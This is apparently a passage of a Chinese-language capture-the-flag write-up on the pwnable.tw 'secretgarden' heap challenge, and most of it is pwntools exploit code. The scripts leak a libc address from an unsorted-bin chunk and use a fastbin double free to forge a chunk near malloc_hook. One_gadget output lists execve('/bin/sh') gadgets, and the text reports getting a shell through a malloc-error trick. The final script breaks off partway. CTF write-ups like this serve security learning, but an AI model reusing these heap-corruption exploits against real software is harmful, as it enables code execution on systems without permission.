class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;bbb&#x27;</span>,<span class="string">b&#x27;bbb&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;ddd&#x27;</span>,<span class="string">b&#x27;ddd&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+<p>這邊先malloc一塊大chunk，再來malloc一塊小chunk，防止unsorted bin chunk跟top chunk合併，之後free掉大chunk</p>
+<p>可以看到大chunk fd bk都有libc address</p>
+<div class="img-item" data-src="/2024/09/21/Pwnable-secretgarden/a.png" data-sub-html=".caption"><img src="/2024/09/21/Pwnable-secretgarden/a.png" class=""></div>
+
+<p>之後malloc一塊 0x450，然而他會先malloc一塊0x30(從unsorted bin裡面割出去)<br>所以我們先clean，把原來的0x30 free掉，在malloc<br>就可以乾淨的拿到chunk了</p>
+<p>並且我malloc後會蓋到fd，所以我們把fd padding成a，收bk的libc<br>之後就是老步驟，開attach gdb 找offset</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10203&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_offset = 0x1048</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;main offset&#x27;</span>,<span class="number">0x1048</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, color</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Length of the name :&#x27;</span>,<span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;The name of flower :&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;The color of the flower :&#x27;</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Which flower do you want to remove from the garden:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;bbb&#x27;</span>,<span class="string">b&#x27;bbb&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;ddd&#x27;</span>,<span class="string">b&#x27;ddd&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;flower[0] :&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;aaaaaaa\n&#x27;</span>)</span><br><span class="line">leaklibc = u64(rcl().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = leaklibc - <span class="number">0x3c3b78</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKLIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<p>到目前為止已經leaklibc</p>
+<p>那就來打double free</p>
+<p>先觀察malloc hook 跟 free hook附近</p>
+<div class="img-item" data-src="/2024/09/21/Pwnable-secretgarden/b.png" data-sub-html=".caption"><img src="/2024/09/21/Pwnable-secretgarden/b.png" class=""></div>
+
+<div class="img-item" data-src="/2024/09/21/Pwnable-secretgarden/c.png" data-sub-html=".caption"><img src="/2024/09/21/Pwnable-secretgarden/c.png" class=""></div>
+
+<p>free hook附近一片空白，那就打malloc hook</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2 -&gt; chunk3 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>
+
+<p>malloc chunk 2，把chunk偽造於 malloc hook - 0x23</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk 3 -&gt; chunk 2 -&gt; mallochook - 0x23</span><br></pre></td></tr></table></figure>
+
+<p>malloc三次拿到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10203&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_offset = 0x1048</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;main offset&#x27;</span>,<span class="number">0x1048</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, color</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Length of the name :&#x27;</span>,<span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;The name of flower :&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;The color of the flower :&#x27;</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Which flower do you want to remove from the garden:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;bbb&#x27;</span>,<span class="string">b&#x27;bbb&#x27;</span>) <span class="comment">#idx 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;ddd&#x27;</span>,<span class="string">b&#x27;ddd&#x27;</span>) <span class="comment">#idx 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">b&#x27;flower[0] :&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;aaaaaaa\n&#x27;</span>)</span><br><span class="line">leaklibc = u64(rcl().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = leaklibc - <span class="number">0x3c3b78</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKLIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">libc_malloc_hook = libcbase + <span class="number">0x3c3b10</span></span><br><span class="line">libc_system = libcbase + <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakechunk = libc_malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;AAA&#x27;</span>,<span class="string">b&#x27;AAA&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;BBB&#x27;</span>,<span class="string">b&#x27;BBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin : chunk2 -&gt; chunk3 -&gt; chunk 2 -&gt; ...</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,p64(fakechunk),<span class="string">b&#x27;CCC&#x27;</span>) <span class="comment"># chunk 3 -&gt; chunk 2 -&gt; mallochook - 0x23</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;DDD&#x27;</span>,<span class="string">b&#x27;DDD&#x27;</span>) <span class="comment"># get chunk 3</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;EEE&#x27;</span>,<span class="string">b&#x27;EEE&#x27;</span>) <span class="comment"># get chunk 2</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span>+p64(libc_system) ,<span class="string">b&#x27;P&#x27;</span>) <span class="comment"># get malloc hook - 0x23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># show()</span></span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;MALLOC HOOK&#x27;</span>,<span class="built_in">hex</span>(libc_malloc_hook))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBC SYSTEM&#x27;</span>,<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>當我打到這裡我發現了一件事<br>就是system(0x28)<br>會crash<br>也就是說透過修改malloc hook成system不可行</p>
+<p>嘗試跳onegadget</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-virtual-machine:~/Desktop/pwn/pwnable/secret_garden$ one_gadget libc_64.so<span class="number">.6</span> </span><br><span class="line"><span class="number">0x45216</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4526a</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xef6c4</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf0567</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但試了許多次都沒辦法成功<br>因為並沒有滿足條件</p>
+<p>突然想到之前在看house of roman有個trick，透過觸發 malloc_err 可以觸發到 malloc_hook<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/</a></p>
+<p>試了一下成功get shell</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>本第第二第三第四個one gadget都可以用，但是遠端只有第二個可以用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10203&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_offset = 0x1048</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;main offset&#x27;</span>,<span class="number">0x1048</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, color</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span 